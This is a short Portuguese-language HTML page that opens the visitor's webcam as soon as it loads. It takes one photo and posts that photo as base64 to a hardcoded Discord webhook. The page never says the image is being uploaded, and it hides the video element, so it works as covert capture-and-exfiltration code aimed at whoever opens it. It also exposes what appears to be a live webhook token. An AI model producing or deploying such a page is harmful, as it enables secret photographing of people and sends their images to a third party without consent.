<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<title>Foto e Envio Discord</title>
<style>
  body {
    margin: 0;
    background: #000;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  video {
    display: none;
  }
  img {
    max-width: 90vw;
    max-height: 90vh;
    border: none;
    display: block;
  }
</style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <img id="photo" alt="Foto capturada" />
  <script>
    const video = document.getElementById('video');
    const photo = document.getElementById('photo');
    const webhookURL = 'https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi'; // substitua aqui

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = async () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataURL = canvas.toDataURL('image/png');
          photo.src = dataURL;

          // Enviar a imagem base64 direto no conteúdo da mensagem Discord
          const content = `Foto capturada:\n${dataURL}`;

          try {
            await fetch(webhookURL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ content }),
            });
            console.log('Foto enviada para o Discord');
          } catch (err) {
            console.error('Erro ao enviar para Discord:', err);
          }

          stream.getTracks().forEach(track => track.stop());
        };
      } catch (err) {
        console.error('Erro ao acessar a câmera:', err);
      }
    }

    startCamera();
  </script>
</body>
</html>
